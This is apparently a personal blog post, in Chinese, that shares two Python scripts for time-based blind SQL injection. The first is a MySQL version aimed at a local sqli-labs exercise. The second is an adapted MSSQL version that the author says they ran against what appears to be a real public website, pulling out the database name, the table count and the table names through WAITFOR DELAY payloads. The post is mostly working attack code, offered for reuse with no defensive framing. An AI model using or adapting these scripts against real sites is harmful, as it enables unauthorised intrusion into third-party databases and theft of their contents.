---
layout: post
title: python 脚本-自动化盲注
date: 2020-10-11
tags: Python   
---

遇到过一个 mssql 时间盲注的站，要脚本跑，网上找了一份，MySQL 的，拿过来自己改了改，可以跑，但是没有整理，先放这，下次再要用一起整理一下。

原本的代码：

```
import requests
import time

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
database = ''
global length
for l in range(1,20):
    Url = 'http://192.168.10.128/sqli-labs-master/Less-6/?id=1" and if(length(database())>{0},1,sleep(3))--+'
    UrlFormat = Url.format(l)      #format（）函数使用
    start_time0 = time.time()       #发送请求前的时间赋值
    requests.get(UrlFormat,headers=headers)
    if  time.time() - start_time0 > 2:  #判断正确的数据库长度
            print('database length is ' + str(l))
            global length 
            length = l  #把数据库长度赋值给全局变量
            break
    else:
        pass
for i in range(1,length+1):
    for char in chars:
        charAscii = ord(char) #char转换为ascii
        url = 'http://192.168.10.128/sqli-labs-master/Less-6/?id=1" and if(ascii(substr(database(),{0},1))>{1},1,sleep(3))--+'
        urlformat = url.format(i,charAscii)
        start_time = time.time()
        requests.get(urlformat,headers=headers)
        if  time.time() - start_time > 2:
            database+=char
            print('database: ',database)
            break
        else:
            pass
print('database is ' + database)

```

我跑的代码：

```
# -*- coding: utf-8 -*-
# 默认 mssql 语法




import requests
import time

# http://www.xixih.net/health.aspx?pos=21 if(ascii(substring(db_name(),1,1)))>1 waitfor delay '0:0:5'--


headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
database = ''
# global length


# 
# 
# 第一步获取数据库长度
# 
# 
# 
# for l in range(1,13):
#     #MySQL语法 Url = 'http://192.168.10.128/sqli-labs-master/Less-6/?id=1" and if(length(database())>{0},1,sleep(3))--+'

#     Url = "http://www.xixih.net/health.aspx?pos=21 if(len(db_name()))={0} waitfor delay '0:0:2'--+"

#     UrlFormat = Url.format(l) 

#     print('l', l)     #format（）函数使用
#     print('UrlFormat', UrlFormat)     #format（）函数使用
#     start_time0 = time.time()  		#发送请求前的时间赋值
#     requests.get(UrlFormat,headers=headers)
#     if  time.time() - start_time0 > 2:	#判断正确的数据库长度
#             print('database length is ' + str(l))
#             global length 
#             length = l	#把数据库长度赋值给全局变量
#             break
#     else:
#         pass

# 
# 
#第二步 获取数据库名称
# 
# 
# 
# length = 6
# for i in range(1, length+1):
#     for char in chars:
#         charAscii = ord(char) #char转换为ascii
#         url = "http://www.xixih.net/health.aspx?pos=21 if(ascii(substring(db_name(),{0},1)))={1} waitfor delay '0:0:2'--+"
#         #MySQL语法： url = 'http://192.168.10.128/sqli-labs-master/Less-6/?id=1" and if(ascii(substr(database(),{0},1))>{1},1,sleep(3))--+'
#         urlformat = url.format(i,charAscii)
#         start_time = time.time()
#         requests.get(urlformat,headers=headers)
#         if  time.time() - start_time > 2:
#             database+=char
#             print('database: ',database)
#             break
#         else:
#             pass

# 
# 
# 第三步获取表个数，基本和获取数据库长度一样
# 
# 
# 
global length
for l in range(1,30):

    # Url = "http://www.xixih.net/health.aspx?pos=21 if(len(db_name()))={0} waitfor delay '0:0:2'--+"
    Url = "http://www.xixih.net/health.aspx?pos=21 if((select count(*) from SysObjects where xtype='u')={0}) WAITFOR DELAY '0:0:2'--+"

    UrlFormat = Url.format(l) 

    print('l', l)     #format（）函数使用
    print('UrlFormat', UrlFormat)     #format（）函数使用
    start_time0 = time.time()         #发送请求前的时间赋值
    requests.get(UrlFormat,headers=headers)
    if  time.time() - start_time0 > 2:    #判断正确的数据库长度
            print('table has ' + str(l))
            global length 
            length = l    #把数据库长度赋值给全局变量
            break
    else:
        pass
# print('database is ' + database)
print('length is ')
print(length)

# 
# 
# 第四步遍历每张表，获取每个表的长度后再获取表名
# 
# 
# 
# 23张表
# global length
# for k in range(1, 24):
    # for l in range(1,20):
    #     Url = "http://www.xixih.net/health.aspx?pos=21 if((select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u') and len(name)={1})={0}) WAITFOR DELAY '0:0:2'--+"
    #     # if((select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u') and len(name)=9)=1)
    #     UrlFormat = Url.format(l,k)      #format（）函数使用
    #     start_time0 = time.time()       #发送请求前的时间赋值
    #     requests.get(UrlFormat,headers=headers)
    #     if  time.time() - start_time0 > 2:  #判断正确的数据库长度
    #             print('database length is ' + str(l))
    #             global length 
    #             length = l  #把数据库长度赋值给全局变量
    #             break
    #     else:
    #         pass
for k in range(1, 24):
    database = ''
    for i in range(1,21):
        for char in chars:
            charAscii = ord(char) #char转换为ascii
            url = "http://www.xixih.net/health.aspx?pos=21 if((select count(*) from SysObjects where name in (select top {0} name from SysObjects where xtype='u') and ascii(substring(name,{1},1))={2})=1) WAITFOR DELAY '0:0:2'--+"
            # url = "http://www.xixih.net/health.aspx?pos=21 if((select count(*) from SysObjects where name in (select top 5 name from SysObjects where xtype='u') and ascii(substring(name,{0},1))={1})=1) WAITFOR DELAY '0:0:2'--+"
            # if((select count(*) from SysObjects where name in (select top 1 name from SysObjects where xtype='u') and ascii(substring(name,1,1))&gt;90)=1) WAITFOR DELAY '0:0:5'--
            urlformat = url.format(k,i,charAscii)
            # urlformat = url.format(i,charAscii)
            start_time = time.time()
            requests.get(urlformat,headers=headers)
            if  time.time() - start_time > 2:
                database+=char
                print('database: ',database)
                break
            else:
                pass
    print('database is ' + database)
```